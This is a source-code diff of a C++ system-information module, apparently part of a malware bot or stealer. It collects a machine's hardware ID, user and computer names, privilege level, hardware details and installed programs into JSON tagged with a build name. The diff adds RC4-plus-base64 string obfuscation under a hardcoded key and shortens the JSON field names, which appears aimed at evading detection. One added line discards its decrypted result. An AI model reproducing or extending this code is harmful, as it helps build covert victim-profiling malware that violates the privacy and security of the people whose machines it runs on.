@@ -4,6 +4,8 @@
 #include <intrin.h>
 #include <list>
 
+std::string k = key(0x2cb62029b6082afc);
+
 namespace absent
 {
 	namespace info
@@ -11,25 +13,13 @@ namespace absent
 		class info
 		{
 		public:
-			std::string hardwareID;
-			std::string userName;
-			std::string computerName;
-			std::string operatingSystem;
-			std::string privilege;
-			std::string installPath;
-			std::string cpu;
-			std::string cpuArchitecture;
-			int cpuCores;
-			std::string gpu;
-			int ram;
-			int vram;
-
+			std::string hardwareID, userName, computerName, operatingSystem, privilege, installPath, cpu, cpuArchitecture, gpu;
+			int cpuCores, ram, vram;
 			std::list<std::string> installedPrograms;
 			
 			info( std::list<std::string> pn)
 			{
 				programNeedles = pn;
-
 				getUserName();
 				getComputerName();
 				getOperatingSystem();
@@ -48,20 +38,20 @@ namespace absent
 			nlohmann::json getJson(std::string buildName)
 			{
 				nlohmann::json jInfo = {
-					{"buildName", buildName},
-					{"hardwareID", hardwareID},
-					{"userName", userName},
-					{"computerName", computerName},
-					{"operatingSystem", operatingSystem},
-					{"privilege", privilege},
-					{"installPath", installPath},
-					{"cpu", cpu},
-					{"cpuArchitecture", cpuArchitecture},
-					{"cpuCores", std::to_string(cpuCores)},
-					{"gpu", gpu},
-					{"ram", std::to_string(ram)},
-					{"vram", std::to_string(vram)},
-					{"installedPrograms", installedPrograms}
+					{"bn", buildName},
+					{"hw", hardwareID},
+					{"un", userName},
+					{"cn", computerName},
+					{"os", operatingSystem},
+					{"pr", privilege},
+					{"ip", installPath},
+					{"cp", cpu},
+					{"ca", cpuArchitecture},
+					{"cc", std::to_string(cpuCores)},
+					{"gp", gpu},
+					{"ra", std::to_string(ram)},
+					{"vr", std::to_string(vram)},
+					{"fp", installedPrograms}
 				};
 				return jInfo;
 			}
@@ -114,13 +104,14 @@ namespace absent
 								VS_FIXEDFILEINFO *verInfo = (VS_FIXEDFILEINFO *)lpBuffer;
 								if (verInfo->dwSignature == 0xfeef04bd)
 								{
-									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 10 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 0) operatingSystem = "Windows 10";
-									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 6 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 3) operatingSystem = "Windows 8.1";
-									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 6 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 2) operatingSystem = "Windows 8";
-									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 6 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 1) operatingSystem = "Windows 7";
-									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 6 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 0) operatingSystem = "Windows Vista";
-									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 5 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 2) operatingSystem = "Windows XP 64-Bit Edition";
-									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 5 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 1) operatingSystem = "Windows XP";
+									absent::crypto::RC4 rc4;
+									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 10 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 0) operatingSystem = rc4.crypt(absent::crypto::b64::decode("9Qmskf2FqzW7Dw=="), k);
+									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 6 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 3)  operatingSystem = rc4.crypt(absent::crypto::b64::decode("9Qmskf2FqzWyERo="), k);
+									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 6 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 2)  operatingSystem = rc4.crypt(absent::crypto::b64::decode("9Qmskf2FqzWy"), k);
+									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 6 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 1)  operatingSystem = rc4.crypt(absent::crypto::b64::decode("9Qmskf2FqzW9"), k);
+									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 6 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 0)  operatingSystem = rc4.crypt(absent::crypto::b64::decode("9Qmskf2FqzXcVlg+AQ=="), k);
+									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 5 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 2)  operatingSystem = rc4.crypt(absent::crypto::b64::decode("9Qmskf2FqzXSbwt8VHv4/6MQI5phqc/fCg=="), k);
+									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 5 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 1)  rc4.crypt(absent::crypto::b64::decode("9Qmskf2FqzXSbw=="), k);
 								}
 							}
 						}
